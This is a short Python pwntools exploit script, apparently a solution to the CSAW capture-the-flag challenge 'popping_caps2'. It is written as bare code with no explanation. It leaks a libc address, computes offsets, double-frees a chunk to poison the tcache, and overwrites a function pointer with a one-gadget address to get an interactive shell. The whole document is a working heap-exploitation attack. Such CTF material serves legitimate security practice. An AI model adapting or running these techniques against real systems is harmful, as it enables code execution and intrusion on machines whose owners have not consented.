from pwn import *

r = process("./popping_caps2")
#r = remote("pwn.chal.csaw.io", 1008)
r.recvuntil("system ")
leak = r.recvline()
leak = int(leak, 16)
libcbase = leak - 0x4f440
mallochook = libcbase + 0x3ebc30

r.recvuntil(":")

def malloc(size):
  r.sendline("1")
  r.recvuntil(":")
  r.sendline(str(size))
  r.recvuntil(":")

def free(off):
  r.sendline("2")
  r.recvuntil(":")
  r.sendline(str(off))
  r.recvuntil(":")

def write(data):
  r.sendline("3")
  r.recvuntil(":")
  r.send(data)

offset = libcbase + 0x400000 + 0x228060 + 3904
funcptr = libcbase + 0x400000 + 0x228060 + 3840
free(offset + 0x10)
free(offset + 0x10)

stdinvtable = libcbase + 0x3ec758
malloc(0x30)
write(p64(funcptr))
malloc(0x30)
malloc(0x30)
onegad = libcbase + 0x10a398
print hex(onegad)
pause()
write(p64(onegad))

r.interactive()
